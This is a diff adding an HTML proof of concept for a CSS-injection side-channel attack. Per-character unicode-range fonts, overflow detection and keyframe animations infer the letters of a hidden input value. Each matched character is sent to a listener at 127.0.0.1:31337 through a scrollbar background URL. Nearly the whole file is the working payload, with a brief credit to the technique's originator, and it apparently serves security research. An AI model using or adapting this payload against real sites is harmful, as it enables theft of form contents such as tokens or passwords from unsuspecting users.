@@ -1,0 +1,156 @@
+<!doctype html>
+<html>
+<head>
+<!-- look mom! no external fonts allowed! -->
+<body>
+<style>
+/* comic sans is high (lol) and causes a vertical overflow */
+@font-face{font-family:has_A;src:local('DejaVu Sans');unicode-range:U+41;font-style:monospace;}
+@font-face{font-family:has_B;src:local('DejaVu Sans');unicode-range:U+42;font-style:monospace;}
+@font-face{font-family:has_C;src:local('DejaVu Sans');unicode-range:U+43;font-style:monospace;}
+@font-face{font-family:has_D;src:local('DejaVu Sans');unicode-range:U+44;font-style:monospace;}
+@font-face{font-family:has_E;src:local('DejaVu Sans');unicode-range:U+45;font-style:monospace;}
+@font-face{font-family:has_F;src:local('DejaVu Sans');unicode-range:U+46;font-style:monospace;}
+@font-face{font-family:has_G;src:local('DejaVu Sans');unicode-range:U+47;font-style:monospace;}
+@font-face{font-family:has_H;src:local('DejaVu Sans');unicode-range:U+48;font-style:monospace;}
+@font-face{font-family:has_I;src:local('DejaVu Sans');unicode-range:U+49;font-style:monospace;}
+@font-face{font-family:has_J;src:local('DejaVu Sans');unicode-range:U+4a;font-style:monospace;}
+@font-face{font-family:has_K;src:local('DejaVu Sans');unicode-range:U+4b;font-style:monospace;}
+@font-face{font-family:has_L;src:local('DejaVu Sans');unicode-range:U+4c;font-style:monospace;}
+@font-face{font-family:has_M;src:local('DejaVu Sans');unicode-range:U+4d;font-style:monospace;}
+@font-face{font-family:has_N;src:local('DejaVu Sans');unicode-range:U+4e;font-style:monospace;}
+@font-face{font-family:has_O;src:local('DejaVu Sans');unicode-range:U+4f;font-style:monospace;}
+@font-face{font-family:has_P;src:local('DejaVu Sans');unicode-range:U+50;font-style:monospace;}
+@font-face{font-family:has_Q;src:local('DejaVu Sans');unicode-range:U+51;font-style:monospace;}
+@font-face{font-family:has_R;src:local('DejaVu Sans');unicode-range:U+52;font-style:monospace;}
+@font-face{font-family:has_S;src:local('DejaVu Sans');unicode-range:U+53;font-style:monospace;}
+@font-face{font-family:has_T;src:local('DejaVu Sans');unicode-range:U+54;font-style:monospace;}
+@font-face{font-family:has_U;src:local('DejaVu Sans');unicode-range:U+55;font-style:monospace;}
+@font-face{font-family:has_V;src:local('DejaVu Sans');unicode-range:U+56;font-style:monospace;}
+@font-face{font-family:has_W;src:local('DejaVu Sans');unicode-range:U+57;font-style:monospace;}
+@font-face{font-family:has_X;src:local('DejaVu Sans');unicode-range:U+58;font-style:monospace;}
+@font-face{font-family:has_Y;src:local('DejaVu Sans');unicode-range:U+59;font-style:monospace;}
+@font-face{font-family:has_Z;src:local('DejaVu Sans');unicode-range:U+5a;font-style:monospace;}
+@font-face{font-family:has_0;src:local('DejaVu Sans');unicode-range:U+30;font-style:monospace;}
+@font-face{font-family:has_1;src:local('DejaVu Sans');unicode-range:U+31;font-style:monospace;}
+@font-face{font-family:has_2;src:local('DejaVu Sans');unicode-range:U+32;font-style:monospace;}
+@font-face{font-family:has_3;src:local('DejaVu Sans');unicode-range:U+33;font-style:monospace;}
+@font-face{font-family:has_4;src:local('DejaVu Sans');unicode-range:U+34;font-style:monospace;}
+@font-face{font-family:has_5;src:local('DejaVu Sans');unicode-range:U+35;font-style:monospace;}
+@font-face{font-family:has_6;src:local('DejaVu Sans');unicode-range:U+36;font-style:monospace;}
+@font-face{font-family:has_7;src:local('DejaVu Sans');unicode-range:U+37;font-style:monospace;}
+@font-face{font-family:has_8;src:local('DejaVu Sans');unicode-range:U+38;font-style:monospace;}
+@font-face{font-family:has_9;src:local('DejaVu Sans');unicode-range:U+39;font-style:monospace;}
+@font-face{font-family:rest;src: local('Ubuntu Mono');font-style:monospace;unicode-range:U+0-10FFFF}
+
+input.leak {
+    -webkit-writing-mode: horizontal-tb !important;
+    text-rendering: auto;
+    color: -internal-light-dark-color(black, white);
+    letter-spacing: normal;
+    word-spacing: normal;
+    text-transform: none;
+    text-indent: 0px;
+    text-shadow: none;
+    text-align: start;
+    -webkit-appearance: textarea;
+    background-color: -internal-light-dark-color(white, black);
+    -webkit-rtl-ordering: logical;
+    flex-direction: column;
+    resize: none;
+    cursor: text;
+    white-space: pre-wrap;
+    overflow-wrap: break-word;
+    margin: 0em;
+    border-width: 0px;
+    padding: 0px;
+
+    display: block;
+    overflow-y: auto; /* leak channel */
+    overflow-x: hidden; /* remove false positives */
+    height: 30px; /* comic sans capitals exceed this height */
+    font-size: 0px; /* make suffix invisible */
+    letter-spacing: 0px; /* separation */
+    word-break: break-all; /* small width split words in lines */
+    font-family: rest; /* default */
+    background: grey; /* default */
+    width: 0px; /* initial value */
+    animation: loop step-end 200s 0s, trychar step-end 2s 0s; /* animations: trychar duration must be 1/100th of loop duration */
+    animation-iteration-count: 1, infinite; /* single width iteration, repeat trychar one per width increase (or infinite) */
+}
+
+input.leak::first-line{
+    font-size: 30px; /* prefix is visible in first line */
+    text-transform: uppercase; /* only capital letters leak */
+}
+
+/* iterate over all chars */
+@keyframes trychar {
+    0% { font-family: rest; } /* delay for width change */
+    5% { font-family: has_A, rest; --leak: url("http://127.0.0.1:31337/a"); }
+    6% { font-family: rest; }
+    10% { font-family: has_B, rest; --leak: url("http://127.0.0.1:31337/b"); }
+    11% { font-family: rest; }
+    15% { font-family: has_C, rest; --leak: url("http://127.0.0.1:31337/c"); }
+    16% { font-family: rest }
+    20% { font-family: has_D, rest; --leak: url("http://127.0.0.1:31337/d"); }
+    21% { font-family: rest; }
+    25% { font-family: has_E, rest; --leak: url("http://127.0.0.1:31337/e"); }
+    26% { font-family: rest; }
+    30% { font-family: has_F, rest; --leak: url("http://127.0.0.1:31337/f"); }
+    31% { font-family: rest; }
+    35% { font-family: has_G, rest; --leak: url("http://127.0.0.1:31337/g"); }
+    36% { font-family: rest; }
+    40% { font-family: has_H, rest; --leak: url("http://127.0.0.1:31337/h"); }
+    41% { font-family: rest }
+    45% { font-family: has_I, rest; --leak: url("http://127.0.0.1:31337/i"); }
+    46% { font-family: rest; }
+    50% { font-family: has_J, rest; --leak: url("http://127.0.0.1:31337/j"); }
+    51% { font-family: rest; }
+    55% { font-family: has_K, rest; --leak: url("http://127.0.0.1:31337/k"); }
+    56% { font-family: rest; }
+    60% { font-family: has_L, rest; --leak: url("http://127.0.0.1:31337/l"); }
+    61% { font-family: rest; }
+    65% { font-family: has_M, rest; --leak: url("http://127.0.0.1:31337/m"); }
+    66% { font-family: rest; }
+    70% { font-family: has_N, rest; --leak: url("http://127.0.0.1:31337/n"); }
+    71% { font-family: rest; }
+    75% { font-family: has_O, rest; --leak: url("http://127.0.0.1:31337/o"); }
+    76% { font-family: rest; }
+    80% { font-family: has_P, rest; --leak: url("http://127.0.0.1:31337/p"); }
+    81% { font-family: rest; }
+    85% { font-family: has_Q, rest; --leak: url("http://127.0.0.1:31337/q"); }
+    86% { font-family: rest; }
+    90% { font-family: has_R, rest; --leak: url("http://127.0.0.1:31337/r"); }
+    91% { font-family: rest; }
+    95% { font-family: has_S, rest; --leak: url("http://127.0.0.1:31337/s"); }
+    96% { font-family: rest; }
+}
+
+/* increase width char by char, i.e. add new char to prefix */
+@keyframes loop {
+    0% { width: 0px }
+    1% { width: 20px }
+    2% { width: 40px }
+    3% { width: 60px }
+    4% { width: 80px }
+    4% { width: 100px }
+    5% { width: 120px }
+    6% { width: 140px }
+    7% { width: 0px }
+}
+
+input::-webkit-scrollbar {
+    background: blue;
+}
+
+/* side-channel */
+input::-webkit-scrollbar:vertical {
+    background: blue var(--leak);
+}
+</style>
+<p>single css injection w/o remote fonts to leak charset ft. @kinugawamasato's <a href="https://mksben.l0.cm/2015/10/css-based-attack-abusing-unicode-range.html">unicode-range</a> technique</p>
+<p>the trick is using detectable layout differences between default fonts. there are probably many similar and more efficient methos.</p>
+<hr>
+<input class="leak" value="abcd" hidden />
+<textarea>asd</textarea>
